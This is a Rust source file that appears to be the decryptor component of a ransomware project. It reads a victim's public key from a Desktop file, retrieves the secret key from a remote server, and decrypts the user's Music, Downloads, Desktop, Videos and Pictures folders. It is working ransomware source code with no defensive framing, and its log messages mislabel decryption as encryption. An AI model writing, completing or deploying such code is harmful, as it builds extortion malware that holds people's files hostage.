use std::fs;
use std::io::{self, Write};
use std::path::PathBuf;

use anyhow::Result;

// use c_monster_co_2ic80::cryptography::encrypt::decrypt_folder;
use c_monster_co_2ic80::cryptography::decrypt_parallel::decrypt_folder_parallel;
use c_monster_co_2ic80::debug::DEBUG_ENABLED;
use c_monster_co_2ic80::debug_log;
use c_monster_co_2ic80::networking::client::get_key;

use sodiumoxide::crypto::box_::PublicKey;

use windows::{
    Win32::UI::Shell::{
        FOLDERID_Desktop, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Pictures, FOLDERID_Videos,
        KNOWN_FOLDER_FLAG, SHGetKnownFolderPath,
    },
    core::PWSTR,
};

fn desktop_file_path(filename: &str) -> Result<PathBuf> {
    unsafe {
        let path: PWSTR = SHGetKnownFolderPath(&FOLDERID_Desktop, KNOWN_FOLDER_FLAG(0), None)?;

        let desktop = path.to_string().unwrap();
        Ok(PathBuf::from(desktop).join(filename))
    }
}

// DECRYPTING
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    sodiumoxide::init().unwrap();

    let result = run_decryption().await;

    if DEBUG_ENABLED {
        println!("\nPress Enter to exit...");
        io::stdout().flush()?;
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
    }

    result
}

async fn run_decryption() -> Result<(), Box<dyn std::error::Error>> {
    let pk_path = desktop_file_path("public_key.donotdelete")?;
    let pk_bytes = fs::read(pk_path)?;
    let pk = PublicKey::from_slice(&pk_bytes).ok_or("key has to be 32 bytes")? as PublicKey;

    let sk = get_key(&pk).await?;

    let paths = [
        FOLDERID_Music,
        FOLDERID_Downloads,
        FOLDERID_Desktop,
        FOLDERID_Videos,
        FOLDERID_Pictures,
    ];

    unsafe {
        for path in paths {
            let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
            let path_str = path_ptr.to_string().unwrap();
            let path_buf: PathBuf = path_str.into();

            // match decrypt_folder(&path_buf, &pk, &sk) {
            match decrypt_folder_parallel(&path_buf, &pk, &sk) {
                Ok(_) => debug_log!("✓ Successfully encrypted: {:?}", path_buf),
                Err(e) => debug_log!("✗ Error encrypting {:?}: {}", path_buf, e),
            }
        }
    }

    Ok(())
}
